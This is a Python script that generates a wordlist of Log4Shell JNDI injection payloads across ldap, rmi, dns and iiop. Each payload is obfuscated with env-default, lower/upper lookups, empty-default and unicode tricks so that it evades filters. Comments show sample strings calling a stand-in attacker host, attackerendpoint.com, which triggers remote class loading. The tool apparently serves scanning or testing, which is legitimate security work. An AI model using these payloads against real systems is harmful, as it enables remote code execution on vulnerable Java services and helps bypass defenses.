templates = [
    '${{jndi}:{protocol}://{collaborator}/z}' # ${jndi:ldap://attackerendpoint.com/z}
]

protocols = [
    'ldap',
    'rmi',
    'dns',
    'iiop'
]


def generate():
    wordlist = []

    for template in templates:
        for protocol in protocols:
            # ${jndi:ldap://attackerendpoint.com/z}
            wordlist.append(template.replace('{jndi}', 'jndi').replace('{protocol}', protocol))

            # ${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/z}
            jndiTmp = '${env:ENV_NAME:-j}ndi'
            protocolTmp = '${env:ENV_NAME:-' + protocol[0] + '}' + protocol[1:]
            colonTmp = '${env:ENV_NAME:-:}'
            wordlist.append(template.replace(':', colonTmp).replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

            # ${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/z}
            jndiTmp = '${lower:j}ndi'
            protocolTmp = '${lower:' + protocol[0] + '}' + protocol[1:]
            wordlist.append(template.replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

            # ${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/z}
            jndiTmp = '${upper:j}ndi'
            protocolTmp = '${upper:' + protocol[0] + '}' + protocol[1:]
            wordlist.append(template.replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

            # ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
            jndiTmp = '${::-j}${::-n}${::-d}${::-i}'
            protocolTmp = ''.join(['${::-' + c + '}' for c in protocol])
            wordlist.append(template.replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

            # ${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/z}
            jndiTmp = '${env:BARFOO:-j}ndi'
            protocolTmp = '${env:BARFOO:-' + protocol[0] + '}' + protocol[1:]
            colonTmp = '${env:BARFOO:-:}'
            wordlist.append(template.replace(':', colonTmp).replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

            # ${${lower:jnd}${lower:${upper:%u0069}}:ldap://attackerendpoint.com/z} //Notice the unicode "i"
            wordlist.append(template.replace('{jndi}', '${lower:jnd}${lower:${upper:%u0069}}').replace('{protocol}', protocol))

            # ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://attackerendpoint.com/z}
            jndiTmp = '${lower:j}${upper:n}${lower:d}${upper:i}'
            protocolTmp = list(protocol)
            protocolTmp[0] = '${lower:' + protocolTmp[0] + '}'
            protocolTmp[-1] = '${lower:' + protocolTmp[-1] + '}'
            protocolTmp = ''.join(protocolTmp)
            wordlist.append(template.replace('{jndi}', jndiTmp).replace('{protocol}', protocolTmp))

    
    return wordlist
